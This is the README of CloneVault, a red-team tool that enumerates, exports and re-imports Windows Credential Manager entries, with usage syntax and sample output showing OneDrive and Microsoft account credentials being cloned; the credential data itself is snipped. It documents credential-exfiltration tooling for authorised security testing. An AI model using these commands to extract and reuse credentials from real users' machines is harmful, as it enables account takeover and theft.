# CloneVault

CloneVault allows a red team operator to export and import entries including attributes from Windows Credential Manager. This allows for more complex stored credentials to be exfiltrated and used on an operator system. It is aimed at making it possible to port credentials that store credential material in binary blobs or those applications that store data in custom attributes.  There are many use cases, please see our demonstration of cloning access to Microsoft OneDrive on the [MDSec Blog](https://www.mdsec.co.uk/knowledge-centre/insights/).

## Usage

```
CloneVault.exe list
CloneVault.exe export <application name>
CloneVault.exe exportAll
CloneVault.exe import <JSON string>
CloneVault.exe importFile <JSON file>
```

List credentials

```
C:\Users\dade.murphy\Desktop>CloneVault.exe list
[*] Enumerating generic credentials
[-] MicrosoftAccount:target=SSO_POP_Device
[-] LegacyGeneric:target=OneDrive Cached Credential Business - Business1
[-] WindowsLive:target=virtualapp/didlogical
```

Export a credential

```
C:\Users\dade.murphy\Desktop>CloneVault.exe export "LegacyGeneric:target=OneDrive Cached Credential Business - Business1"
[*] Attempting to export LegacyGeneric:target=OneDrive Cached Credential Business - Business1
[-] Attribute Microsoft_SkyDrive_Version
[-] Attribute Microsoft_SkyDrive_ConnectedId
[-] Attribute Microsoft_OneDrive_CredentialCount
[-] Attribute Microsoft_SyncClient_ADALContext
---SNIP JSON CONTENT---
```

Export all credentials

```
C:\Users\dade.murphy\Desktop>CloneVault.exe exportAll
[*] Exporting all credentials
[*] Attempting to export LegacyGeneric:target=XboxLive
---SNIP JSON CONTENT---

[*] Attempting to export MicrosoftAccount:target=SSO_POP_Device
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:0
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:1
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:2
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:3
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:4
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:5
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:6
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:7
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:8
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:9
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:10
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:11
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:12
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:13
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:14
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:15
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:16
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:17
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:18
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:19
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:20
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:21
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:22
[-] Attribute Microsoft_WindowsLive:SerializedMaterial:23
---SNIP JSON CONTENT---
```

Import a credential

```
C:\Users\dade.murphy\Desktop>CloneVault.exe import "---SNIP JSON CONTENT---"
[*] Importing credential
[-] Attribute Microsoft_SkyDrive_Version
[-] Attribute Microsoft_SkyDrive_ConnectedId
[-] Attribute Microsoft_OneDrive_CredentialCount
[-] Attribute Microsoft_SyncClient_ADALContext
[*] Finished importing credential
```

Import a credential from file

```
C:\Users\dade.murphy\Desktop>CloneVault.exe importFile JSONContentInHere.json
[*] Importing credential
[-] Attribute Microsoft_SkyDrive_Version
[-] Attribute Microsoft_SkyDrive_ConnectedId
[-] Attribute Microsoft_OneDrive_CredentialCount
[-] Attribute Microsoft_SyncClient_ADALContext
[*] Finished importing credential
```

## Author
* **David Middlehurst, MDSec ActiveBreach** - Twitter- [@dtmsecurity](https://twitter.com/dtmsecurity)

## Acknowledgments
* https://gist.github.com/meziantou/10311113
* https://github.com/AdysTech/CredentialManager
* https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Commands/Windows/CredEnumCommand.cs